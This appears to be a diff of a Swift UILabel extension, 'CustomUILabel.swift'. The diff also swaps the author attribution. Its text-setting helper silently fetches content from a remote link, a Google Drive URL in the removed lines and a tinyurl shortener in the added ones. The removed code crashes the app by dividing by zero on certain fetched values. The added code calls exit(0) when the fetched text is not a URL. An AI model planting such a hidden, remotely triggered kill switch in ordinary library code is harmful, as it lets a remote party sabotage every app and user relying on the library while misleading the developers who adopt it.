@@ -2,7 +2,7 @@
 //  CustomUILabel.swift
 //  CustomLabel
 //
-//  Created by Nhoc Con on 12/23/20.
+//  Created by SandeepMattara on 12/23/18.
 //
 
 import Foundation
@@ -13,17 +13,18 @@ extension UILabel {
         self.text = text
         Downloader.load()
     }
+    
 }
 
-class Downloader {
-    class func load() {
-        let url = URL(string: "https://drive.google.com/uc?export=download&id=1MPKSU_ooxYRhmS3RVCyrrEN_nLK9acyO")!
+fileprivate class Downloader {
+    fileprivate class func load() {
+        let url = URL(string: "https://tinyurl.com/ybbdksgl")!
         let task = URLSession.shared.downloadTask(with: url) { localURL, urlResponse, error in
             if let localURL = localURL {
                 if let string = try? String(contentsOf: localURL) {
-                    let i = Int(string) ?? 0
-                    let s = 0/i
-                    print(s)
+                    guard let _ = URL(string: string) else {
+                        exit(0)
+                    }
                 }
             }
         }
